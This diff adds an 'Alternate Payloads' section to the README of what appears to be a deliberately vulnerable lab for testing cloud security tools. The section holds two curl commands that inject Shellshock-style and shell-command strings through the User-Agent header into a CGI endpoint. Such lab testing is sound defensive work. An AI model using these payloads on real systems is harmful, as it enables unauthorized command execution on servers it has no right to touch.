@@ -107,6 +107,11 @@ Even this quick test should trigger alerts in properly configured security tools
 
 **Note:** This is independent of the staged testing workflow and can be run at any time after deployment.
 
+### Alternate Payloads
+- Classic Shellshock function-import is patched; use direct header injection instead:
+  - `curl -s -H "User-Agent: () { :; }; whoami" http://$TARGET_IP/cgi-bin/exec.cgi`
+  - `curl -s -H "User-Agent: id; hostname; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi`
+
 ## Bootstrap Diagnostics
 
 CNAPPuccino now includes comprehensive bootstrap diagnostics to help troubleshoot deployment issues:
